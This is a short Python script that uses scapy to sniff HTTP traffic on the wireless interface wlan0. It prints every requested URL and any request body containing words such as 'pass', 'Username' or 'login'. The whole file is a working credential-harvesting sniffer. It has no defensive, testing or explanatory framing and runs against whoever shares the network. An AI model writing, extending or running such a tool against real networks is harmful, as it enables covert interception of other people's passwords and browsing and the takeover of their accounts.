import scapy.all as scapy
from scapy.sendrecv import sniff
from scapy.layers import http

def sniffer(interface):
    scapy.sniff(iface=interface,store=False,prn=psp)

def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')

def userinfo(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode('utf-8')
            keywordslink = ["name", "pass", "Username", "Password", "login"]
            for keywords in keywordslink:
                if keywords in load:
                    return load

                  
def psp(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("link >>"+url)

        userpass = userinfo(packet)
        if userpass:
            print("password >>"+userpass)
       
sniffer("wlan0")   